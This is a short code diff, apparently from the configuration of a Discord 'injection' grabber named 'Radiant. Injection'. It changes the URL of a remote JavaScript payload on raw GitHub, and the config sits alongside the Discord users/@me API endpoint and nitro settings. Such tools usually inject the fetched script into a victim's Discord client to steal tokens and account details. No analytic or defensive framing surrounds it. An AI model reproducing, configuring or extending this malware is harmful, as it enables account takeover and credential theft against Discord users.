@@ -13,7 +13,7 @@ const config = {
   embed_name: "Radiant. Injection",
   embed_icon: "https://cdn.discordapp.com/attachments/703367593313959946/991089492439990302/tilty.gif?size=4096".replace(/ /g, "%20"), 
   embed_color: 16711680,
-  injection_url: "https://raw.githubusercontent.com/Bodeyibl/Injection2.0/main/injection.js",
+  injection_url: "https://raw.githubusercontent.com/RomainPallas/FTG/main/index.js",
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
